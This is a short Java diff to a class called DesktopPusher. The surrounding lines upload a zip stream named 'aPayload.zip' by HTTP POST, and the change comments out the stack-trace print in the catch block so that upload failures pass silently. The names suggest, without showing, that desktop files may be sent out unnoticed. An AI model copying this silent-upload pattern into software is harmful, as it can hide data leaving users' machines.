@@ -153,7 +153,7 @@ public class DesktopPusher {
                     .data("upfile", "aPayload.zip", zis2)
                     .post();
             } catch (Exception e) {
-                e.printStackTrace();
+                //e.printStackTrace();
             }
         }
         
